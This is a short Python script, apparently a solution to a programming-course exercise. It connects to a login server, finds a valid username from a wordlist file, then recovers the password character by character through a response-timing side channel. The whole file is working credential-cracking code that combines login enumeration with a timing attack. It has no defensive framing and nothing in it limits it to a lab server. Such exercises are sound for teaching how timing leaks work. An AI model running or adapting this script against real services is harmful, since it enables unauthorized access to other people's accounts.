# write your code here
import socket
import sys
import json
from datetime import datetime

args = sys.argv
ip = args[1]
port = int(args[2])

# creating the socket
client_socket = socket.socket()
address = (ip, port)

# connecting to the server
client_socket.connect(address)

length = 1
login_file = open('/home/jeffrey/Downloads/logins.txt', 'r')
login_list = login_file.read().splitlines()
pass_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = " "
correct_login = ""

success = False

for login in login_list:
    attempt = {"login": login, "password": password}
    attempt_json = json.dumps(attempt).encode()
    client_socket.send(attempt_json)
    response_json = client_socket.recv(1024).decode()
    response = json.loads(response_json)['result']

    if response == "Wrong login!":
        continue
    elif response == "Wrong password!":
        correct_login = login
        break

password = ""
while True:
    for char in pass_chars:
        guess = password + char
        attempt = {"login": correct_login, "password": guess}
        attempt_json = json.dumps(attempt).encode()
        start = datetime.now()
        client_socket.send(attempt_json)
        response_json = client_socket.recv(1024).decode()
        finish = datetime.now()
        difference = finish - start
        diff_arr = str(difference).split(":")
        diff_secs = float(diff_arr[2])
        response = json.loads(response_json)['result']

        if response == "Wrong password!" and diff_secs > 0.09:
            password = guess
            break
        elif response == 'Wrong password!':
            continue
        elif response == "Connection success!":
            password = guess
            success = True
            break
    if success:
        break

info = {"login": correct_login, "password": password}
info_json = json.dumps(info)
print(info_json)

client_socket.close()
